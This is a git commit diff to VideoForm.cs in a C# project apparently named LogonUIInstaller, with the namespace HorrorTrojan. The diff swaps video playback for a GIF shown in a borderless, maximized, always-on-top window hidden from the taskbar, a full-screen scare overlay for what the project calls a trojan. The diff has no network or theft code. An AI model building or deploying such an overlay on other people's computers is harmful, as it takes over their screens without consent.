67cde62e04dbe19be449e997f6b76685e9b8b7c1
Virusodel <134794046+Virusodel@users.noreply.github.com>
2026-09-05 12:05:22 +0300

    Update VideoForm.cs

--- LogonUIInstaller/VideoForm.cs
+++ LogonUIInstaller/VideoForm.cs
@@ -1,27 +1,72 @@
 using System;
+using System.Drawing;
 using System.Windows.Forms;
-using AxWMPLib;
+using System.IO;
 
 namespace HorrorTrojan
 {
     public partial class VideoForm : Form
     {
-        public VideoForm(string videoPath)
+        private PictureBox pictureBox;
+        private Image gifImage;
+
+        public VideoForm(string gifPath)
         {
             InitializeComponent();
-            LoadVideo(videoPath);
+            LoadGif(gifPath);
         }
 
-        private void LoadVideo(string videoPath)
+        private void InitializeComponent()
+        {
+            this.pictureBox = new PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
+            this.SuspendLayout();
+
+            // pictureBox
+            this.pictureBox.Dock = DockStyle.Fill;
+            this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+            this.pictureBox.BackColor = System.Drawing.Color.Black;
+
+            // VideoForm
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 600);
+            this.Controls.Add(this.pictureBox);
+            this.FormBorderStyle = FormBorderStyle.None;
+            this.WindowState = FormWindowState.Maximized;
+            this.TopMost = true;
+            this.ShowInTaskbar = false;
+            this.BackColor = System.Drawing.Color.Black;
+            this.Name = "VideoForm";
+            this.Text = "";
+
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
+            this.ResumeLayout(false);
+        }
+
+        private void LoadGif(string gifPath)
         {
             try
             {
-                this.videoPlayer.URL = videoPath;
-                this.videoPlayer.settings.autoStart = true;
-                this.videoPlayer.settings.setMode("loop", false);
-                this.videoPlayer.Ctlcontrols.play();
+                if (File.Exists(gifPath))
+                {
+                    gifImage = Image.FromFile(gifPath);
+                    this.pictureBox.Image = gifImage;
+                    this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+                    ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
+                }
             }
             catch { }
+        }
+
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing)
+            {
+                gifImage?.Dispose();
+                pictureBox?.Dispose();
+            }
+            base.Dispose(disposing);
         }
     }
 }
